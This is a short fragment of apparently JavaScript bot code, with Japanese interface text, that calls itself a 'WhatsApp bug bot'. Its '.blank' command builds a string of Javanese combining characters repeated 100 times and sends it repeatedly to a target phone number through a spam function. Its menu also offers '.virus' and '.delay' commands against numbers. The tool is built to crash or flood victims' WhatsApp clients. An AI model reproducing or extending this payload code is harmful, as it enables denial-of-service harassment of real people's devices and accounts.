...
いらっしゃいませ 誤用しないでください。WhatsApp アカウントが禁止される可能性があります。`;
...
if (text.startsWith('.blank')) {  
  const parts = text.split(/\s+/);  
  const target = parts[1];  
  const isi = 'ꦾ, ꦿ,ꦿ༗꩝'.repeat(100);  
  await kirimSpam(target, isi, chatId, '.blank', 5, 10);  
  return;  
}  
...
const caption = `これを入力してください賢く使ってくださいこんにちは、私の名前は<b>lawliet</b>です。私は<b>rifat</b>によって作られたWhatsAppバグボットです。メニューを選択してください
<b>MENU</b>
[______________________________
[<b>.virus</b> 62×××××
[<b>.delay</b> 62×××××
